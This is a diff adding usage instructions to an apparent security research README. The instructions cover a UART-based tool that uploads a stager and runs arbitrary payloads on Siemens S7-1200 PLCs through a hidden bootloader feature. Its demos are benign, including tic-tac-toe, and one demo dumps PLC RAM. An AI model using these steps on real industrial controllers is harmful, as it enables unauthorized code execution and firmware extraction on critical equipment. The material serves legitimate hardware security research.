@@ -130,9 +130,11 @@ The idea behind the implementation is as follows:
 We spotted similar functionality in 2014 models of S7-1212C Siemens PLCs (6ES7212-1BE31-0XB0). The bootloader functionality was spotted at offset 0xE664 of older PLC bootloader (S7-1200v3).
 
 
+
 ### Setup Environment
 
-As mentioned earlier we used a 6ES7 212-1AE40-0XB0 S7-1200 PLC with a ALLNET ALL3075V3 Network controlled socket and a FTDI FT232RL USB to TTL Serial Converter. 
+As mentioned earlier we used a 6ES7 212-1AE40-0XB0 S7-1200 PLC with a [ALLNET ALL3075V3](https://www.allnet-shop.de/ALLNET/Gebaeudeautomation/Netzwerk-Steckdosen-und-Schaltgeraete/ALLNET-Netzwerksteckdose-mit-WLAN-Verbrauchserfassung-16A-ALL3075v3.html) Network controlled socket and a FTDI FT232RL USB to TTL Serial Converter. 
+
 
 
 
@@ -148,4 +150,138 @@ One can use any TTL 3.3V device. Obviously you should connect TX pin of the TTL 
 
 
 ## Using our tool
-We are still completing this section. 
+
+Once you copied our repo go to uart_rce folder and get the name of TTYUSB Adapter in /dev. Generally it will be /dev/TTYUSB0 (This name is hardcoded in start.sh). You also need to install required python and `arm-none-eabi` compiler to compile payload for the PLC. Additionally, you must set the IP address of `ALLNET ALL3075V3` to `192.168.0.100` (you can change this value inside client.sh script). 
+
+
+To actually compile the payload go to `uart_rce/payloads` folder. There are various payloads available. Each payload have a [build.sh](uart_rce/payloads/hello_world/build.sh) file. To compile them you can go inside the folder and run the build bash file. For example, here we compile the hello_world payload which is used for our test mode :
+
+
+```console
+research@ali-Plex-9:~/SiemensS7-Bootloader/uart_rce/payloads/hello_world/$ sh build.sh
+```
+
+Once we are done compiling the payloads for Cortex-R4 CPU, we can open the channel for forwarding our UART serial data to a TCP port which will be used by our client utility. This console window should show you raw UART traffic between PLC and client utility:
+
+```console
+research@ali-Plex-9:~/SiemensS7-Bootloader/uart_rce$ sh start.sh
+```
+
+### DEMO 1: Upload and executing stager and test payloads 
+
+Now, we can use our client utility. Open a new console window (without closing the console which runs `start.sh`), and type the following command for uploading the stager and test payload to the UART: 
+
+```console
+research@ali-Plex-9:~/SiemensS7-Bootloader/uart_rce$ sh client.sh --switch-power --powersupply-delay=1 test
+```
+
+The `--powersupply-delay` is provided for Cold-boot style firmware dumping (we do not use it at this stage but providing this item is required). The argument `test` uses the payload in `payloads/hello_world/hello_world.bin` file. This payload literraly just run inside the PLC and send string `TEST` back to the client, thus client knows the code successfully executed inside the PLC.  
+
+
+
+
+
+
+### DEMO 2: Upload and execution Tic-tac-toe inside the S7 PLC
+
+
+In this demo we decided to upload the Tic-tac-toe game to the PLC. The goal of this demo is to demonstrate running more complex form of programs inside the PLC. To upload the game, you need to first compile it: 
+
+
+
+```console
+research@ali-Plex-9:~/SiemensS7-Bootloader/uart_rce/payloads/tic_tac_toe$ make
+cc tic_tac_toe.c
+cc ../lib/stdlib.c
+cc ../lib/print.c
+cc ../lib/string.c
+cc ../lib/read.c
+ld tic_tac_toe.sym
+strip tic_tac_toe
+objcopy tic_tac_toe.ihex
+objcopy tic_tac_toe.bin
+```
+
+Now we must use the tictactoe mode of our script utility as it allows us to interact with the PLC and have stream of input/output:
+
+
+```console
+research@ali-Plex-9:~/SiemensS7-Bootloader/uart_rce$ sh client.sh --switch-power --powersupply-delay=1 tictactoe --payload=payloads/tictactoe/build/tictactoe.bin
+```
+
+Note that the tictactoe mode, allow us to use alternative payloads using `--payload` argument. So we are not bounded to only use the tictactoe.bin payload. 
+
+
+### DEMO 3: Running the Greetings From PLC in an infinite loop
+
+We have alternate version of `hello_world` which the PLC instead of sending a single string `TEST` back to the client utility, it will send string `Gretings from PLC` in an infinite loop to the client utility.  This payload is located inside `uart_rce/payloads/hello_loop/`. Since this payload is written in C, you need to compile it using make command: 
+
+
+```console
+research@ali-Plex-9:~/SiemensS7-Bootloader/uart_rce/payloads/hello_loop$ make
+cc hello_loop.c
+cc ../lib/stdlib.c
+cc ../lib/print.c
+cc ../lib/string.c
+cc ../lib/read.c
+ld hello_loop.sym
+strip hello_loop
+objcopy hello_loop.ihex
+objcopy hello_loop.bin
+```
+
+This will generate `hello_loop.bin` file, which will be used by our client utility and will be uploaded to the PLC to get executed. Now we can send the payload to the PLC using tictactoe mode with different payload:
+
+
+```console
+research@ali-Plex-9:~/SiemensS7-Bootloader/uart_rce$ sh client.sh --switch-power --powersupply-delay=1 tictactoe --payload=payloads/hello_loop/build/hello_loop.bin
+```
+
+
+
+### DEMO 4: Dumping S7 PLC RAM
+
+To dump the PLC memory, we would recommend to first turn on the PLC for few seconds, to let the PLC copy contents of the NAND flash to the RAM (alternatively you can wait as long as you want!). We specially designed --powersupply-delay argument in our utility for this purpose. We use dump mode in our utility followed by -a argument which user supplies address to dump and -l argument for the byte size. 
+
+Similar to other demos we need to first compile our payload:
+
+```console
+research@ali-Plex-9:~/SiemensS7-Bootloader/uart_rce/payloads/dump_mem$ make
+cc dump_mem.c
+cc ../lib/stdlib.c
+cc ../lib/print.c
+cc ../lib/string.c
+cc ../lib/read.c
+ld dump_mem.sym
+strip dump_mem
+objcopy dump_mem.ihex
+objcopy dump_mem.bin
+```
+
+
+Now we are ready to dump the PLC. Here we put power supply delay argument to 30 seconds (PLC turn on, wait 30 seconds for PLC to boot, then reset it and use special access feature). 
+
+
+```console
+research@ali-Plex-9:~/SiemensS7-Bootloader/uart_rce$ sh client_bricked.sh --switch-power --powersupply-delay=30 dump -a 0x691E28 -l 256
+```
+
+In this example, we dump 256 bytes starting from offset `0x691E28` of the PLC memory. Once utility dump the memory, it place it in `uart_rce/` folder with the prefix name mem_dump_ plus start and end range address (mem_dump_00691e28_00691f28). 
+
+
+
+## Possible Issues: 
+
+The client utility generally inform you about existence of special access feature on the PLC bootloader. It also fetch the bootloader version from the PLC, as shown below:
+
+```console
+Looping now
+[+] Got connection
+[+] Got special access greeting: -CPU [2d435055]
+[*] sending packet: 0200fe
+[+] Got PLC bootLoader version: V4.2.1
+[*] sending packet: 04803bc27f
+```
+
+
+Our utility currently only supports S7 bootloader version `4.2.1`. The client utility can inform you which bootloader version you are using but fails to communicate with stager or upload the payload. To use it with different S7 PLC with other bootloader version, you probably need to dump the new bootloader from the PLC SPI flash (no desoldering required) and identify various hardcoded function addresses we have in `uart_rce/payloads/`, `uart_rce/stager/` and `uart_rce/lib/`. 
